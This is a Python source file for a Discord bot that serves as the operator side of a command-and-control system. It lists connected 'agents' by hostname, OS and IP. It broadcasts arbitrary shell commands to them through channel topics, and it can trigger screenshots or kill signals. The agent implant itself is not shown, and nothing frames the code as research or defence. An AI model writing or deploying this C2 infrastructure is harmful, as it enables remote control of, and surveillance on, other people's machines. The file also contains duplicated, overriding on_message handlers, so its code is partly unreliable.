import discord
from discord.ext import commands
import asyncio
import datetime
import re

# Configuration - replace with your values
BOT_TOKEN = "YOUR_BOT_TOKEN"
GUILD_ID = 123456789012345678  # Replace with your Discord server ID
CONTROL_CHANNEL_NAME = "control"  # Channel where operator types !agents, etc.
AGENT_CHANNEL_PREFIX = "agent-"   # All agent channels start with this

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    # Ensure control channel exists
    guild = bot.get_guild(GUILD_ID)
    if guild:
        control = discord.utils.get(guild.channels, name=CONTROL_CHANNEL_NAME)
        if not control:
            # Create it if missing
            await guild.create_text_channel(CONTROL_CHANNEL_NAME)
            print(f"Created #{CONTROL_CHANNEL_NAME} channel")
    print("Bot is ready!")

@bot.event
async def on_message(message):
    # Ignore messages from the bot itself
    if message.author == bot.user:
        return

    # Only process messages in the target guild
    if message.guild.id != GUILD_ID:
        return

    # Process commands (both control and agent channels)
    await bot.process_commands(message)

@bot.command(name="agents", help="List all active agents")
async def list_agents(ctx):
    """List all agent channels with their info (from channel topic)."""
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return

    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    
    if not agent_channels:
        await ctx.send("No agents currently connected.")
        return

    embed = discord.Embed(title="Active Agents", color=0x00ff00)
    for ch in agent_channels:
        # Channel topic contains agent info (set by agent on startup)
        topic = ch.topic or "No info"
        # Format: "Agent: username@hostname | OS: ... | IP: ..."
        embed.add_field(name=f"#{ch.name}", value=topic, inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name="broadcast", help="Send a command to all agents")
async def broadcast(ctx, *, command):
    """Broadcast a shell command to all agents."""
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return

    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    
    if not agent_channels:
        await ctx.send("No agents to broadcast to.")
        return

    # Set each agent's channel topic to the command
    for ch in agent_channels:
        await ch.edit(topic=f"cmd:run {command}")
    
    await ctx.send(f"Broadcast command `{command}` to {len(agent_channels)} agents.")

@bot.command(name="killall", help="Kill all agents")
async def kill_all(ctx):
    """Send kill signal to all agents."""
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return

    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    
    for ch in agent_channels:
        await ch.edit(topic="cmd:kill")
    
    await ctx.send(f"Kill signal sent to {len(agent_channels)} agents.")

# Commands inside agent channels
@bot.event
async def on_message(message):
    await bot.process_commands(message)  # Allow prefix commands to work

@bot.listen()
async def on_message(message):
    # This handles commands typed directly in agent channels
    if message.author == bot.user:
        return
    if message.guild.id != GUILD_ID:
        return

    # Only process messages in agent channels
    if not message.channel.name.startswith(AGENT_CHANNEL_PREFIX):
        return

    # Check for agent commands
    content = message.content.strip()
    if content.startswith("!run "):
        cmd = content[5:].strip()
        await message.channel.edit(topic=f"cmd:run {cmd}")
        await message.add_reaction("✅")
    elif content == "!screenshot":
        await message.channel.edit(topic="cmd:screenshot")
        await message.add_reaction("✅")
    elif content == "!kill":
        await message.channel.edit(topic="cmd:kill")
        await message.add_reaction("✅")
    else:
        # Unknown command – ignore or send hint
        pass

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
